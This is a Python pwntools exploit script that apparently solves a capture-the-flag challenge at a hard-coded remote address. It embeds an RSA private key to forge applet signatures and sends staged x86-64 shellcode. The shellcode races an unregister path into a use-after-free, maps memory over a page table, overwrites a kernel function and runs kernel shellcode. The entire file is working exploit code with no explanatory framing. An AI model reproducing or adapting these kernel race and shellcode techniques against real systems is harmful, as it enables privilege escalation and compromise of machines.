from pwn import *
import hashlib
from Crypto.Signature import pkcs1_15
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import binascii

context.arch = 'amd64'

###Util
def genKey(size):
    '''
    k = RSA.generate(size)
    print(f'n = {k.n}')
    print(f'e = {k.e}')
    print(f'd = {k.d}')
    print(f'p = {k.p}')
    print(f'q = {k.q}')
    '''
    #n, e, d, p, q
    n = 21171009082903914951667318370642291045692796869958954643722088216142147882253767840887961100355137710362089495842852802587997892237625941064021250560476799326167191827697121941664794224698136464211627744698488458728738531470357408114552250412380210131627601562747041931086880317900979156590999732467529644272118410952441808977318917199874844809309666527342405701370009997253257393475623148604320310819277246488115240652534663038253877478550757625917385995616022874955900085296787079261560024157208651754992639295414413303051790549870265343065330370613104200620617655392887957154686849585510179728449780413388407485437
    e = 65537
    d = 1610107298494954576771103828201990313021565265408744978912245268951988961687647319238686850396647620929738080315771840049120779016210493259507574623587538139393759645195834109552508516020746855543384738186267926521182157033143551145077697394111815651442160506112912457772247481949096775275625836039966501815186091296962456250361999034430216192307282026608357073654805784882869176163072093716668340111897748037285113505033467615759514537063051266117269168609094815157533508013585686085106853147229077530260563057006340468064491249346259710638459872691616543300897343211945547136911447593155569475182437025095589705153
    p = 134044562026558397395438271043288356414291825175675883159490011085282417582339680523519465390585341987506003474384039595224765284764033208095162251323944101019624805110895671722701334251805913017367906573654002903179372603553250865107088458905591402201596665174871103887468507363529267586248647333373151288897
    q = 157940081737215714101272835747726670030883118110573418327888351745825766243034021141082130293326962308794122812021643730127210359909773858053458232302462101221368621273042912989097374820896132106599699654192664950598693111405879872729221562288749012832240796190575347983220641281491057761896899682073808133821
    k = RSA.construct((n, e, d, p, q))
    s = pkcs1_15.new(k)
    return s

def calcAppletAidSig(bcode, nonce, signer):
    message = int.to_bytes(signer._key.n, 0x100, 'little') + int.to_bytes(signer._key.e, 0x100, 'little') + nonce.ljust(0x100, b'\x00')[:0x100] + bcode
    digest = SHA256.new(message)
    aid = u64(digest.digest()[:8])
    sig = signer.sign(digest)
    return aid, sig

###Exploit
r = remote('44.200.0.49', 10104)

signer = genKey(2048)

aid1, sig1 = calcAppletAidSig(b'\x00'*0x10, b'', signer)
aid2, sig2 = calcAppletAidSig(b'\x00'*0x20, b'', signer)
print(hex(aid1))
print(hex(aid2))

#for applet processor
sc = asm(f'''
          jmp MAIN

          //rsi -> buf, rdx -> size
          READ_MSG:
            READ_LOOP:
              mov rax, 0
              mov rdi, 0x100
              syscall
              cmp rax, 0
              jle READ_LOOP
              sub rdx, rax
              add rsi, rax
              cmp rdx, 0
              jne READ_LOOP
            ret

          //rsi -> buf, rdx -> size
          WRITE_RESPONSE:
            mov rax, 1
            mov rdi, 0x101
            syscall
            ret

          //rsi -> buf, rdx -> size
          WRITE_INTERRUPT:
            mov rax, 1
            mov rdi, 0x102
            syscall
            ret

          //rdi -> addr, rsi -> size, rdx -> prot, r10 -> flags, r8 = fd, r9 = offset
          MMAP:
            mov rax, 9
            syscall
            ret

          //rdi -> sec
          SLEEP:
            push 0
            push rdi
            lea rdi, [rsp]
            xor rsi, rsi
            mov rax, 35
            syscall
            pop rax
            pop rax
            ret

          MAIN:
            //setup buffer
            mov rdi, 0x10000000
            mov rsi, 0x10000
            mov rdx, 7
            mov r10, 0x32
            mov r8, 0xffffffffffffffff
            mov r9, 0
            call MMAP

            //register base applet
            mov rsi, 0x10008000
            mov rdx, 0x1109
            call READ_MSG
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x01
            mov qword ptr [rsi + 1], 0
            mov rdx, 9
            call WRITE_RESPONSE

            //register additional applet
            mov rsi, 0x10008000
            mov rdx, 0x1109
            call READ_MSG
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x01
            mov qword ptr [rsi + 1], 0
            mov rdx, 9
            call WRITE_RESPONSE

            //accept invoke
            mov rsi, 0x10008000
            mov rdx, 0x3121
            call READ_MSG
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x02
            mov qword ptr [rsi + 1], 0
            mov rdx, 9
            call WRITE_RESPONSE

            ////// KERNEL EXPLOIT //////
            //KERNEL_STATE_SYNC_REGISTER
            mov rsi, 0x10008000
            mov rdx, 0x1109
            call READ_MSG
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x01
            mov qword ptr [rsi + 1], 0xffffffffffffffff
            mov rdx, 9
            call WRITE_RESPONSE

            //KERNEL_SLEEP
            mov rdi, 1
            call SLEEP

            //KERNEL_BRINK_OF_UNREG

            //KERNEL_RACE_DUMMY_INTERRUPT (dummy, note that we cant use other interrupts since they will cause pipe to fill up)
            //or maybe we can, just have to do write retry, leave for later... 
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0xf3
            mov rdx, 1
            call WRITE_INTERRUPT

            //KERNEL_RACE_INVOKE_INTERRUPT
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0xf2
            mov qword ptr [rsi + 0x01], 0
            mov rax, {aid2}
            mov qword ptr [rsi + 0x09], rax
            mov qword ptr [rsi + 0x11], 0
            mov qword ptr [rsi + 0x19], 0
            mov qword ptr [rsi + 0x21], 0
            mov rdx, 0x5089
            call WRITE_INTERRUPT

            //KERNEL_ACTUAL_UNREG
            //trigger unreg (digest -> interrupt 1, signature -> interrupt 2)

            //KERNEL_RACE_INVOKE_REQUEST
            mov rsi, 0x10008000
            mov rdx, 0x3121
            call READ_MSG

            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x02
            mov qword ptr [rsi + 1], 0
            mov rdx, 9
            call WRITE_RESPONSE

            //KERNEL_RACE_FREE

            //KERNEL_STATE_SYNC_SLEEP
            mov rdi, 4
            call SLEEP

            //KERNEL_SEND_OVERWRITE_INTERRUPT
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0xf1
            mov qword ptr [rsi + 0x01], 1
            mov qword ptr [rsi + 0x09], 0
            // overwrite kAppletInvoke function (0xc000 = base, 0x4b3f = offset)
            mov qword ptr [rsi + 0x1011], 0x10007
            mov rdx, 0x2011
            call WRITE_INTERRUPT
            mov rsi, 0x10008000
            mov rdx, 0x6091
            call READ_MSG
            mov rsi, 0x10008000
            mov byte ptr [rsi], 0x03
            mov qword ptr [rsi + 1], 0
            mov rdx, 0x9
            call WRITE_RESPONSE

          TAG:
          jmp TAG
          ''').ljust(0x1000, b'\xcc')

r.sendlineafter(b'length : ', str(len(sc)).encode())
r.sendafter(b'shellcode : ', sc)

#fragmentize heap, required to ensure fetching phys results in top of list chunk
#for userspace
sc = asm(f'''
          jmp MAIN

          //rdi -> req, rsi -> res
          REGISTER:
            mov rax, 0xffff0000
            syscall
            ret

          //rdi -> req, rsi -> res
          UNREGISTER:
            mov rax, 0xffff0001
            syscall
            ret

          //rdi -> req, rsi -> res
          INVOKE:
            mov rax, 0xffff0002
            syscall
            ret

          //rdi -> req, rsi -> res
          RESULT:
            mov rax, 0xffff0003
            syscall
            ret

          //rsi -> buffer, rdx -> size
          READ:
            mov rax, 0
            mov rdi, 0
            syscall
            ret

          //rsi -> buffer, rdx -> size
          WRITE:
            mov rax, 1
            mov rdi, 1
            syscall

          //rdi -> addr, rsi -> size, rdx -> prot, r10 -> flag, r8 -> fd, r9 -> offset
          MMAP:
            mov rax, 9
            syscall
            ret

          //rdi -> addr, rsi -> size
          MUNMAP:
            mov rax, 11
            syscall
            ret

          MAIN:
            //fragmentize heap
            mov r15, 0x2000
            mov rdi, rsp
            mov rsi, rsp
            FRAG_LOOP:
              call RESULT
              dec r15
              cmp r15, 0
              jne FRAG_LOOP

            //store buffer addr in r15
            lea rax, [rip]
            shr rax, 12
            shl rax, 12
            mov r15, rax

            //CALCULATE MMAP ADDR
            mov r14, r15
            shr r14, 21
            and r14, 0x1ff
            cmp r14, 0
            je DIFF_PD
            SAME_PD:
              mov r14, r15
              shr r14, 21
              dec r14
              shl r14, 21
              jmp FOUND_ADDR
            DIFF_PD:
              mov r14, r15
              shr r14, 21
              inc r14
              shl r14, 21
              mov r13, rsp
              shr r13, 21
              shl r13, 21
              cmp r14, r13
              jne FOUND_ADDR
              shr r14, 21
              inc r14
              shl r14, 21
            FOUND_ADDR:

            //PREPARE CHUNK TO RELEASE (phys addr massage)
            mov rdi, r15
            sub rdi, 0x1000
            mov rsi, 0x1000
            mov rdx, 3
            mov r10, 0x32
            mov r8, 0xffffffffffffffff
            mov r9, 0
            call MMAP

            //KERNEL_REGISTER_BASE
            lea rdi, [r15 + 0x7f0]
            lea rsi, [r15 + 0xb00]
            mov qword ptr [rdi], rsi
            mov qword ptr [rdi + 0x08], 0x10
            add rsi, 0x20
            call REGISTER

            //KERNEL_REGISTER_ADDITIONAL
            lea rdi, [r15 + 0x7f0]
            lea rsi, [r15 + 0xb00]
            mov qword ptr [rdi], rsi
            mov qword ptr [rdi + 0x08], 0x20
            add rsi, 0x20
            call REGISTER

            //KERNEL_INVOKE_TASK
            lea rdi, [r15 + 0x800]
            mov rax, {aid1}
            mov qword ptr [rdi], rax
            mov qword ptr [rdi + 0x08], rdi
            mov qword ptr [rdi + 0x10], 0
            lea rsi, [r15 + 0x800]
            call INVOKE

            //KERNEL_STATE_SYNC_REGISTER
            lea rdi, [r15 + 0x800]
            mov qword ptr [rdi], rdi
            mov qword ptr [rdi + 0x08], 0x10
            lea rsi, [r15 + 0x800]
            call REGISTER

            //KERNEL_BRINK_OF_UNREG
            lea rsi, [r15 + 0x800]
            mov rax, {u64(b"M30W"+p32(10))}
            mov qword ptr [rsi], rax
            mov rdx, 5
            call WRITE
            lea rsi, [r15 + 0x800]
            mov rdx, 1
            call READ

            //KERNEL_ACTUAL_UNREG
            lea rdi, [r15 + 0x800]
            mov rax, {aid2}
            mov qword ptr [rdi], rax
            {chr(10).join(
              ["mov rax, " + str(u64(sig2[i:i + 8])) + chr(10) + "mov qword ptr [rdi + " + str(i + 8) + "], rax" for i in range(0, 0x100, 8)]
            )}
            lea rsi, [r15 + 0x800]
            call UNREGISTER

            //RELEASE_PHYS_CHUNK
            mov rdi, r15
            sub rdi, 0x1000
            mov rsi, 0x1000
            call MUNMAP

            //MMAP_PT_OVERLAP
            mov rdi, r14
            mov rsi, 0x1000
            mov rdx, 3
            mov r10, 0x32
            mov r8, 0xffffffffffffffff
            mov r9, 0
            call MMAP

            //KERNEL_WAIT_FOR_STORAGE_OVERWRITE
            lea rsi, [r15 + 0x800]
            mov rax, {u64(b"M30W"+p32(10))}
            mov qword ptr [rsi], rax
            mov rdx, 5
            call WRITE
            lea rsi, [r15 + 0x800]
            mov rdx, 1
            call READ
            lea rsi, [r15 + 0x800]
            mov rdx, 1
            call READ

            //READ KERNEL SHELLCODE (0x4b3f = func offset)
            lea rsi, [r14 + 0xb3f]
            mov rdx, 0x200
            call READ

            //TRIGGER KERNEL SHELLCODE
            lea rdi, [r15 + 0x800]
            mov qword ptr [rdi + 0x08], rdi
            mov qword ptr [rdi + 0x10], 0
            lea rsi, [r15 + 0x800]
            call INVOKE
          ''').ljust(0x800, b'\xcc') + \
    b'\x00' * 0x100 + int.to_bytes(signer._key.n, 0x100, 'little') + int.to_bytes(signer._key.e, 0x100, 'little') + b'\x00' * 0x20

#print(hex(len(sc) - 0x320))

r.sendline(str(len(sc)).encode())
r.send(sc)

r.recvuntil(b'M30W')
print('kernel wait 1')
sleep(2)
r.send(b'x')

r.recvuntil(b'M30W')
print('kernel wait 2')
sleep(8)
r.send(b'xx')

#for kernel
sc = asm(f'''
          mov dx, 0xf2a9
          mov eax, 0
          out dx, eax

          mov dx, 0x8002
          mov eax, 0
          out dx, eax
          ''').ljust(0x200, b'\xcc')

r.send(sc)

r.interactive()
